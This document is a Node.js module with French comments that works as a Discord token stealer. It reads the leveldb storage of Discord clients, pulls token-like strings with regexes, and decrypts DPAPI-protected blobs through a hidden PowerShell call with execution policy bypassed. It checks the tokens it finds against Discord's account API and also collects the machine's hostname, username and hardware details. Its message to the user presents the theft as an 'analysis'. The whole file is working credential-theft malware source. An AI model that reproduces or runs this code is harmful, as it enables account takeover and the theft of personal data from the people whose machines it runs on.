'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');
const { execFileSync } = require('child_process');

const APPDATA = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');

const TARGETS = [
  { name: 'Discord', dir: path.join(APPDATA, 'discord') },
  { name: 'Discord PTB', dir: path.join(APPDATA, 'discordptb') },
  { name: 'Discord Canary', dir: path.join(APPDATA, 'discordcanary') },
  { name: 'Discord Development', dir: path.join(APPDATA, 'discorddevelopment') }
];

/* Segments volontairement larges : un premier segment trop court fait reculer
   le moteur de regex et tronque le token au lieu de le capturer entierement. */
const PART1 = '[A-Za-z0-9_-]{20,120}';
const PART2 = '[A-Za-z0-9_-]{5,24}';
const PART3 = '[A-Za-z0-9_-]{20,220}';

const PLAIN_RE = new RegExp(
  '(mfa\\.[A-Za-z0-9_-]{80,140})|(' + PART1 + '\\.' + PART2 + '\\.' + PART3 + ')',
  'g'
);
const MFA_RE = /^mfa\.[A-Za-z0-9_-]{80,140}$/;
const STD_RE = new RegExp('^' + PART1 + '\\.' + PART2 + '\\.' + PART3 + '$');

const MAX_DECRYPT_BLOBS = 60;
const MAX_VALIDATION_ATTEMPTS = 8;

function looksLikeToken(value) {
  if (!value) return false;
  const v = String(value).trim();
  return MFA_RE.test(v) || STD_RE.test(v);
}

/**
 * Un token utilisateur Discord standard a un premier segment qui est
 * l'encodage base64url de l'identifiant numerique du compte (un snowflake).
 * On le detecte explicitement : c'est le format que l'on veut privilegier.
 */
function isClassicUserToken(token) {
  const first = String(token).split('.')[0];
  if (!first) return false;
  let decoded = '';
  try {
    decoded = Buffer.from(first.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('latin1');
  } catch (_) {
    return false;
  }
  return /^\d{17,20}$/.test(decoded);
}

function tokenFormat(token) {
  if (MFA_RE.test(token)) return 'mfa';
  if (isClassicUserToken(token)) return 'classique';
  return 'inconnu';
}

function scoreToken(token, keyed, encrypted) {
  let score = 0;
  if (isClassicUserToken(token)) score += 10;
  else if (MFA_RE.test(token)) score += 4;
  if (keyed) score += 3;
  if (encrypted) score += 1;
  return score;
}

function machineInfo() {
  let username = 'inconnu';
  try {
    username = os.userInfo().username;
  } catch (_) {
    username = 'inconnu';
  }
  return {
    hostname: os.hostname(),
    username,
    platform: os.type() + ' ' + os.release(),
    arch: os.arch(),
    cpu: ((os.cpus() || [])[0] || {}).model || 'CPU inconnu',
    ram: Math.round(os.totalmem() / 1073741824) + ' Go'
  };
}

function safeRead(file) {
  try {
    return fs.readFileSync(file).toString('latin1');
  } catch (_) {
    return '';
  }
}

function leveldbFiles(baseDir) {
  const dir = path.join(baseDir, 'Local Storage', 'leveldb');
  let names = [];
  try {
    names = fs.readdirSync(dir);
  } catch (_) {
    return [];
  }
  const out = [];
  for (const name of names) {
    if (!name.endsWith('.ldb') && !name.endsWith('.log')) continue;
    const full = path.join(dir, name);
    let mtime = 0;
    try {
      mtime = fs.statSync(full).mtimeMs;
    } catch (_) {
      mtime = 0;
    }
    out.push({ full, mtime });
  }
  out.sort((a, b) => b.mtime - a.mtime);
  return out.map((entry) => entry.full);
}

function scanPlain(raw) {
  const found = [];
  PLAIN_RE.lastIndex = 0;
  let match;
  while ((match = PLAIN_RE.exec(raw)) !== null) {
    const token = match[0];
    if (token.length < 50) continue;
    const before = raw.slice(Math.max(0, match.index - 90), match.index);
    found.push({ token, keyed: /token/i.test(before) });
  }
  return found;
}

function encryptedCandidates(raw) {
  const set = new Set();
  const re = /[A-Za-z0-9+/]{40,4000}={0,3}/g;
  let match;
  while ((match = re.exec(raw)) !== null) {
    let b64 = match[0];
    const rem = b64.length % 4;
    if (rem !== 0) b64 += '='.repeat(4 - rem);
    let buf;
    try {
      buf = Buffer.from(b64, 'base64');
    } catch (_) {
      continue;
    }
    if (buf.length < 40) continue;
    if (buf[0] === 0x01 && buf[1] === 0x00 && buf[2] === 0x00 && buf[3] === 0x00) {
      set.add(b64);
    }
  }
  return Array.from(set);
}

function dpapiDecryptMany(list) {
  const results = [];
  if (!list.length) return results;

  const CHUNK = 50;
  for (let start = 0; start < list.length; start += CHUNK) {
    const chunk = list.slice(start, start + CHUNK);
    const arrayLiteral = chunk.map((item) => "'" + item + "'").join(',');

    const script =
      "$ErrorActionPreference='SilentlyContinue';" +
      'Add-Type -AssemblyName System.Security;' +
      '$p=@(' + arrayLiteral + ');' +
      'for($i=0;$i -lt $p.Count;$i++){' +
      'try{' +
      '$b=[Convert]::FromBase64String($p[$i]);' +
      '$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);' +
      '[Console]::Out.WriteLine("$i|" + [System.Text.Encoding]::UTF8.GetString($d));' +
      '}catch{}}';

    let out = '';
    try {
      out = execFileSync(
        'powershell.exe',
        ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command', script],
        { encoding: 'utf8', timeout: 25000, windowsHide: true, maxBuffer: 8 * 1024 * 1024 }
      );
    } catch (_) {
      continue;
    }

    for (const line of out.split(/\r?\n/)) {
      const sep = line.indexOf('|');
      if (sep < 1) continue;
      const index = parseInt(line.slice(0, sep), 10);
      const value = line.slice(sep + 1).trim();
      if (!Number.isNaN(index) && value) {
        results.push({ index: start + index, value });
      }
    }
  }

  return results;
}

async function fetchUser(token) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 7000);
  try {
    const res = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: token },
      signal: controller.signal
    });
    if (!res.ok) return null;
    return await res.json();
  } catch (_) {
    return null;
  } finally {
    clearTimeout(timer);
  }
}

async function grabDiscordToken() {
  const candidates = [];
  const seen = new Set();
  let filesScanned = 0;

  const push = (token, source, encrypted, keyed) => {
    const clean = String(token).trim();
    if (!clean || seen.has(clean)) return;
    if (!looksLikeToken(clean)) return;
    seen.add(clean);
    candidates.push({
      token: clean,
      source,
      encrypted: !!encrypted,
      keyed: !!keyed,
      format: tokenFormat(clean),
      score: scoreToken(clean, !!keyed, !!encrypted)
    });
  };

  for (const target of TARGETS) {
    if (!fs.existsSync(target.dir)) continue;

    const files = leveldbFiles(target.dir);
    if (!files.length) continue;

    const blobs = [];

    for (const file of files) {
      const raw = safeRead(file);
      if (!raw) continue;
      filesScanned += 1;

      for (const hit of scanPlain(raw)) {
        push(hit.token, target.name, false, hit.keyed);
      }

      if (blobs.length < MAX_DECRYPT_BLOBS) {
        for (const blob of encryptedCandidates(raw)) {
          if (blobs.length >= MAX_DECRYPT_BLOBS) break;
          blobs.push(blob);
        }
      }
    }

    if (blobs.length) {
      const decrypted = dpapiDecryptMany(blobs);
      for (const item of decrypted) {
        let value = item.value;
        if (value.startsWith('{')) {
          try {
            const parsed = JSON.parse(value);
            if (parsed && typeof parsed.token === 'string') value = parsed.token;
          } catch (_) {
            /* ignore */
          }
        }
        push(value, target.name, true, false);
      }
    }
  }

  if (!candidates.length) {
    return {
      ok: false,
      filesScanned,
      error:
        "Aucun token trouve. Ouvre Discord, connecte-toi (le token est ecrit au demarrage), puis relance l'analyse."
    };
  }

  /* Le tri est stable : a score egal, l'ordre d'apparition (fichier le plus
     recent d'abord) est conserve. */
  candidates.sort((a, b) => b.score - a.score);

  let chosen = null;
  let user = null;

  for (const candidate of candidates.slice(0, MAX_VALIDATION_ATTEMPTS)) {
    const fetched = await fetchUser(candidate.token);
    if (fetched) {
      chosen = candidate;
      user = fetched;
      break;
    }
  }

  if (!chosen) chosen = candidates[0];

  return {
    ok: true,
    token: chosen.token,
    source: chosen.source,
    encrypted: chosen.encrypted,
    format: chosen.format,
    validated: !!user,
    candidates: candidates.length,
    filesScanned,
    user
  };
}

module.exports = { grabDiscordToken, machineInfo, looksLikeToken, isClassicUserToken, tokenFormat };
